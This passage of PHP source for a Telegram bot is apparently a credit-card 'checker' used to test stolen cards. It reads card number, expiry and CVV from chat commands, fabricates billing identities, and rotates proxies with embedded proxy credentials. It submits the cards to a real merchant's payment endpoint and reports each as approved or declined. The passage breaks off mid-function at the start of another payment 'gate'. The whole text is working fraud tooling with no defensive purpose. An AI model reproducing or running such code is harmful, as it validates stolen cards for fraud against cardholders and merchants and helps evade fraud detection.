sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>❌DECLINED</b>%0A<b>RESPONSE:</b> <b>『 ★ Declined : Generic_Decline ★ 』</b>%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Currency:</b> '.$currency.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Unknown Gate</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif (strpos($result1, "generic_decline")){
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>❌DECLINED</b>%0A<b>RESPONSE:</b> <b>『 ★ Declined : Generic_Decline ★ 』</b>%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Currency:</b> '.$currency.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Unknown Gate</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif ((strpos($result, '"cvc_check":"unavailable"')) || (strpos($result, '"cvc_check": "unchecked"')) || (strpos($result, '"cvc_check": "fail"'))){
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>❌DECLINED</b>%0A<b>RESPONSE:</b> <b>『 ★ Security Code Check : '.$cvc_check.' [Proxy Dead/change IP] ★ 』</b>%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Currency:</b> '.$currency.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Unknown Gate</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif ((strpos($result, "Your card was declined.")) || (strpos($result, 'The card was declined.'))){
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>❌DECLINED</b>%0A<b>RESPONSE:</b> <b>『 ★ Card Declined ★ 』</b>%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Currency:</b> '.$currency.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Unknown Gate</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif(!$result){
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>❌DECLINED</b>%0A<b>RESPONSE:'.$result.'%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Currency:</b> '.$currency.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Unknown Gate</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}else{
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>❌DECLINED</b>%0A<b>RESPONSE:'.$result.'%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Currency:</b> '.$currency.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Unknown Gate</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
curl_close($ch);
}

/////////////////////////////////////// U K G 2///////////////////////////////////////////////////


if ((strpos($message, "!unk") === 0)||(strpos($message, "/unk") === 0)){
$lista = substr($message, 5);
$i     = explode("|", $lista);
error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');
function multiexplode($delimiters, $string){
$one = str_replace($delimiters, $delimiters[0], $string);
$two = explode($delimiters[0], $one);
return $two;}
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];
if(strlen($year) == 2){
$year = substr($year, -2);}
else{
$year = substr($year, 2);}
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);
return $str[0];}

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];


$Supported = substr($cc, 0, 1);
 if($Supported == "4") {
    $cctype = '1';
    }
 elseif ($Supported == "5") {
    $cctype = '3';
    }
  else {
    $cctype = '2';
    }


////////////////////////// BIN LOOKUP/////////////////////////////////////////////




    $ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank = getStr($fim, '"bank":{"name":"', '"');
$name = getStr($fim, '"name":"', '"');
$brand = getStr($fim, '"brand":"', '"');
$country = getStr($fim, '"country":{"name":"', '"');
$scheme = getStr($fim, '"scheme":"', '"');
$currency = getStr($fim, '"currency":"', '"');
$emoji = getStr($fim, '"emoji":"', '"');
$type = getStr($fim, '"type":"', '"');
if(strpos($fim, '"type":"credit"') !== false) {
$bin = 'Credit';
}else{
$bin = 'Debit';}
/////////////////////////////////////BIN LOOKUP END////////////////////////////////////////////////////////////////
//----------------------------------------------------------------------------------------------------------------------//
$first = str_shuffle("ZELTRAX");
$last = str_shuffle("ROCKZ");
$first1 = str_shuffle("zeltrax85246");
$email = "".$first1."%40gmail.com";
$address = "".rand(0000,9999)."+Main+Street";
$phone = rand(0000000000,9999999999);
$country = "US";
$st = array("AL","NY","CA","FL","WA");
$st1 = array_rand($st);
$state = $st[$st1];
if ($state == "NY"){
$zip = "10080";
$city = "New+York";}
elseif ($state == "WA"){
$zip = "98001";
$city = "Auburn";}
elseif ($state == "AL"){
$zip = "35005";
$city = "Adamsville";}
elseif ($state == "FL"){
$zip = "32003";
$city = "Orange+Park";}
else{
$zip = "90201";
$city = "Bell";};
////////////////////////////===[Luminati Details]

//$username = 'Put Zone Username Here';
//$password = 'Put Zone Password Here';
//$port = 22225;
//$session = mt_rand();
//$super_proxy = 'zproxy.lum-superproxy.io'

 //=[Proxy Function] =//

$rp1 = array(
  1 => 'wzrpvcjj-rotate:10k9w7pbtsae',
//2 => 'fsaddxm-rotate:ahdasd7asud',
    ); 
    $rpt = array_rand($rp1);
    $rotate = $rp1[$rpt];
$ip = array(
  1 => 'socks5://p.webshare.io:1080',
  2 => 'http://p.webshare.io:80',
    ); 
    $socks = array_rand($ip);
    $socks5 = $ip[$socks];

$url = "https://api.ipify.org/";   
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
$ip1 = curl_exec($ch);
curl_close($ch);
ob_flush();   
if (isset($ip1)){
$ip = "Proxy live";
}
if (empty($ip1)){
$ip = "Proxy Dead:[".$rotate."]";
}




////////////////////////////===[1st Req]

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://www.biztree.com/_Assets/_Global/ajax/processPayment.ajax.php');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept: application/json, text/plain, */*', 
'accept-language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6,fr;q=0.5,pt;q=0.4',
'content-type: application/x-www-form-urlencoded',
'cookie: _gcl_au=1.1.59175331.1612837464; _ga=GA1.2.978311196.1612837464; PHPSESSID=ids5vh3d2j1jrjj612eia6ioi3; _gid=GA1.2.1005526253.1614659153; _gcl_aw=GCL.1614659169.Cj0KCQiAvvKBBhCXARIsACTePW-p9MsevKLL3ugddAG_z80KLt7wG8Y13dhRMxaV12xuYMJJMWpQf6waAtMsEALw_wcB; _gac_UA-32003-6=1.1614659169.Cj0KCQiAvvKBBhCXARIsACTePW-p9MsevKLL3ugddAG_z80KLt7wG8Y13dhRMxaV12xuYMJJMWpQf6waAtMsEALw_wcB; _uetsid=5fd851407b0f11eba31d09582d313af9; _uetvid=5fd895807b0f11eb9cc72b47f16ab66f',
'origin: https://www.biztree.com',
'referer: https://www.biztree.com/pricing/plans/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin'));
//'user-agent: #'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"usersIndexIncluded":{"1":"58299b47505b9d01c42c6ee0cfe76ef5","2":"8c87c102dcc97d143727e9410ef4fac1","3":"4ef6044f01e7eba4f066c12541975a99","5":"b6c02ecef4389270941b299e4ab14e8d","10":"e6bcb4222c9a2e6d3fc49e5bcb0a684e"},"usersIndexOptions":{"5":"5983d62ac78e88a48c1f613e9e702591","10":"d4ce3ff40bf3e3566313c780231aab2a"},"users":{"58299b47505b9d01c42c6ee0cfe76ef5":1,"8c87c102dcc97d143727e9410ef4fac1":2,"4ef6044f01e7eba4f066c12541975a99":3,"b6c02ecef4389270941b299e4ab14e8d":5,"e6bcb4222c9a2e6d3fc49e5bcb0a684e":10,"d36c00de45b4a8674d7d51fc247e83bd":3,"453aafae8fa0c28eeb383202a67b6e73":3,"d335e51e7c7ab7eb20966c671488d980":5,"cf7cf811dc316011c0e471fed341c39e":5,"5983d62ac78e88a48c1f613e9e702591":5,"6711016a45b0d871e7c1bb77bac0be5d":10,"d4ce3ff40bf3e3566313c780231aab2a":10},"usersPrice":{"58299b47505b9d01c42c6ee0cfe76ef5":0,"8c87c102dcc97d143727e9410ef4fac1":0,"4ef6044f01e7eba4f066c12541975a99":0,"b6c02ecef4389270941b299e4ab14e8d":0,"e6bcb4222c9a2e6d3fc49e5bcb0a684e":0,"d36c00de45b4a8674d7d51fc247e83bd":49.95,"453aafae8fa0c28eeb383202a67b6e73":50,"d335e51e7c7ab7eb20966c671488d980":49.95,"cf7cf811dc316011c0e471fed341c39e":49,"5983d62ac78e88a48c1f613e9e702591":99.95,"6711016a45b0d871e7c1bb77bac0be5d":49.95,"d4ce3ff40bf3e3566313c780231aab2a":99.95},"updates":{"00e84ab0b650a88a35f381b426c7fa0a":true,"fb40507ca7887c07e68014ef972ffbb8":true,"06ac88ac2fb47c5af3efae880eef537f":true,"2789439240f9dade8f1bcfe3ef90d310":false},"packages":{"86e0ad7f6161f8341419f2dcde896975":99,"caffad7b408434602e9277703a2a7c18":59,"c308025689358940c6b5ba022a185488":79,"a0bbdc332c35482df2036eb2032852d0":99,"e872fd671ec333f352874b02405a24ec":149,"c316907bc5f0b44cb0ca21f14ece4d26":179,"6b2ebe07e8339c93afc21f5b9be90608":199,"c0d1cf2bb99ce0d3036b3af3686e9225":249,"7f464a7e53670f9cf9e8fb016306e14f":299,"f39f66946c563be867250bac759e0885":297,"b60a7b7fe5054bd46161297ec151e424":249,"af6b214bc42a4a04b9f040911e3cd0fe":279,"6baf9c860da805f79fe8341cbbc86180":299,"683975da113022eb6d2acf8606225877":299,"22bf5d21fd19ff25e5ebbba8c44f42f9":299,"16e11260a4f3227b07eae72da0aec152":399,"5108676a001e49c95e0d16675d66eecf":397,"c9266d0ce6887f18c599c6a1cff3fc87":49,"91146707a52c23b276c3c25ab2a0b4eb":149,"17ba73a26eaa960009fba553bec3b8f8":197,"8ee723c8c416d6acffda0723f6efd696":297,"c84dc8937551d8c028131c8077ceedbf":297,"9d6113f2e35a8b89ea1966fc6a618418":349,"58b2420fcedff7cb010bb5589fecab94":397,"af56f26ac3789429d03bfa2a0b482844":397,"b24744e3268fab5a7686e3e28addd476":159,"520d14d4ce7103303f78cd66e1c0ba7e":179,"ff59ec932cbf600bd223254392744948":179.88,"20ed8ace7bed8b6ad31063295ea90175":199,"2c7f61e11afb900ce4884b3dedd381ee":239.88,"042853eef7b24921c78f7e958c56c651":299,"14b7ab92ef956bb936778a61260b9ba6":299.88,"549439f5ec44dcc8091c2eb86150587e":349,"4b5965e293855dd8dfcb64786882ce64":399,"1bd2a60d663945e864aba3695743353a":449,"77549311e8c31d68ad053362e703f604":499,"817be39772498843c9cfaa9e7314f54b":200.04,"96106e5226095d977fd8e6d84b3278bf":239.88,"51a675c21106b34521c664a7281ab228":179.88,"567a6ea32e112067182e96848fb0a0be":239.88,"7c09127a0bc9fd3ecbed84d6ee8de637":299.88,"203399896825d6644df8a146831b37db":299.88,"1ad21aae3a1fbc5997e81ec6665be553":299.88,"e8b438cb2d3330fa09fe0b5f29a8533f":359.88,"8048aa4bde769b7985c68b97e3546564":359.88},"Languages":"[]","Method":"d83d5aa5c718fef1f06fb86c00eeb38c","FirstName":"Loda","LastName":"Lele","Email":"'.$name.'@gmail.com","Phone":"8888888888","Country":"840","State":"CA","CreditCardNumber":"'.$cc.'","CreditCardType":"'.$cctype.'","CreditCardExpirationMonth":"'.$mes.'","CreditCardExpirationYear":"'.$ano.'","CreditCardCVV":"'.$cvv.'","Version":"567a6ea32e112067182e96848fb0a0be","Extra":"{\"language\":\"en\", \"source\":\"ALLSAAS\" }","LanguagePack":null,"Users":"8c87c102dcc97d143727e9410ef4fac1","Updates":"2789439240f9dade8f1bcfe3ef90d310","TransactionLanguage":"en","cancelURL":"https://www.biztree.com/pricing/plans/","returnURL":"/pricing/plans/thank-you/"}');

$result = curl_exec($ch);
$info = curl_getinfo($ch);
$time = $info['total_time'];
$httpCode = $info['http_code'];
$time = substr($time, 0, 4);



//////////////////////////////////////////////////////////////////////////////////////////////////////////////

 if ((strpos($result, 'incorrect_zip')) || (strpos($result, 'Your card zip code is incorrect.')) || (strpos($result, 'The zip code you supplied failed validation.'))){
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>✅APPROVED</b>%0A<b>RESPONSE:</b> <b>『 ★ CVV MATCHED ★ 』</b>%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Currency:</b> '.$currency.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Unknown Gate</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif ((strpos($result, '"cvc_check":"pass"')) || (strpos($result, "Thank You.")) || (strpos($result, '"status": "succeeded"')) || (strpos($result, "Thank You For Donation.")) || (strpos($result, "Your payment has already been processed")) || (strpos($result, "Success ")) || (strpos($result, '"type":"one-time"')) || (strpos($result, "/donations/thank_you?donation_number="))){
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>✅APPROVED</b>%0A<b>RESPONSE:</b> <b>『 ★ CVV MATCHED ★ 』</b>%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Currency:</b> '.$currency.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Unknown Gate</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif ((strpos($result, 'Your card has insufficient funds.')) || (strpos($result, 'insufficient_funds'))){
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>✅APPROVED</b>%0A<b>RESPONSE:</b> <b> 『 ★ CVV LIVE ★ 』 『 ★ Insufficient Funds ★ 』 </b>%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Currency:</b> '.$currency.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Unknown Gate 2</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif ((strpos($result, "Your card's security code is incorrect.")) || (strpos($result, "incorrect_cvc")) || (strpos($result, "The card's security code is incorrect."))){
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>✅APPROVED</b>%0A<b>RESPONSE:</b> <b>『 ★ CCN MATCHED ★ 』</b>%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Currency:</b> '.$currency.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Unknown Gate</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif ((strpos($result, "Your card does not support this type of purchase.")) || (strpos($result, "transaction_not_allowed"))){
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>❌DECLINED</b>%0A<b>RESPONSE:</b> <b> 『 ★ DECLINED ★ 』 『 ★ Card Doesnt Support Purchase ★ 』</b>%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Currency:</b> '.$currency.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Unknown Gate 2</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif ((strpos($result, "pickup_card")) || (strpos($result, "lost_card")) || (strpos($result, "stolen_card"))){
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>❌DECLINED</b>%0A<b>RESPONSE:</b> <b>『 ★ Pickup Card 「Reported Stolen Or Lost」 ★ 』</b>%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Currency:</b> '.$currency.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Unknown Gate</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif (strpos($result, "do_not_honor")){
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>❌DECLINED</b>%0A<b>RESPONSE:</b> <b>『 ★ Declined : Do_Not_Honor ★ 』</b>%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Currency:</b> '.$currency.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Unknown Gate</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif ((strpos($result, 'The card number is incorrect.')) || (strpos($result, 'Your card number is incorrect.')) || (strpos($result, 'incorrect_number'))){
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>❌DECLINED</b>%0A<b>RESPONSE:</b> <b>『 ★ Incorrect Card Number ★ 』</b>%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Currency:</b> '.$currency.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Unknown Gate</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif ((strpos($result, 'Your card has expired.')) || (strpos($result, 'expired_card'))){
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>❌DECLINED</b>%0A<b>RESPONSE:</b> <b>『 ★ Expired Card ★ 』</b>%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Currency:</b> '.$currency.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Unknown Gate</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif (strpos($result, "generic_decline")){
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>❌DECLINED</b>%0A<b>RESPONSE:</b> <b>『 ★ Declined : Generic_Decline ★ 』</b>%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Currency:</b> '.$currency.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Unknown Gate</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif (strpos($result1, "generic_decline")){
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>❌DECLINED</b>%0A<b>RESPONSE:</b> <b>『 ★ Declined : Generic_Decline ★ 』</b>%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Currency:</b> '.$currency.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Unknown Gate</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif ((strpos($result, '"cvc_check":"unavailable"')) || (strpos($result, '"cvc_check": "unchecked"')) || (strpos($result, '"cvc_check": "fail"'))){
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>❌DECLINED</b>%0A<b>RESPONSE:</b> <b>『 ★ Security Code Check : '.$cvc_check.' [Proxy Dead/change IP] ★ 』</b>%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Currency:</b> '.$currency.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Unknown Gate</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif ((strpos($result, "Your card was declined.")) || (strpos($result, 'The card was declined.'))){
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>❌DECLINED</b>%0A<b>RESPONSE:</b> <b>『 ★ Card Declined ★ 』</b>%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Currency:</b> '.$currency.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Unknown Gate</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif(!$result){
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>❌DECLINED</b>%0A<b>RESPONSE:'.$result.'%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Currency:</b> '.$currency.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Unknown Gate</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}else{
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>❌DECLINED</b>%0A<b>RESPONSE:'.$result.'%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Currency:</b> '.$currency.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Unknown Gate</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
curl_close($ch);
}

/////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////// SQUARE UP ///////////////////////////////////////////////////////////////////

if ((strpos($message, "!squ") === 0)||(strpos($message, "/squ") === 0)){
$lista = substr($message, 5);
error_reporting(0);
if (file_exists(getcwd().('/cookie.txt'))){@unlink('cookie.txt');};

function string_between_two_string($str, $starting_word, $ending_word){ 
$subtring_start = strpos($str, $starting_word); 
$subtring_start += strlen($starting_word);   
$size = strpos($str, $ending_word, $subtring_start) - $subtring_start;   
return substr($str, $subtring_start, $size);
};

function multiexplode($seperator, $string){
$one = str_replace($seperator, $seperator[0], $string);
$two = explode($seperator[0], $one);
return $two;
};
function getStr2($string, $start, $end){
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}
function getStr($string, $start, $end){
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

function RandomString($length){
return substr(str_shuffle("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"), 0, $length);
};

$cc = multiexplode(array(":", "|"), $lista)[0];
$mm = multiexplode(array(":", "|"), $lista)[1];
$yyyy = multiexplode(array(":", "|"), $lista)[2];
$cvv = multiexplode(array(":", "|"), $lista)[3];

if (number_format($mm) < 10){$mm = str_replace("0", "", $mm);};
if (strlen($yyyy) < 4){$yyyy = "20$yyyy";};


 $ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
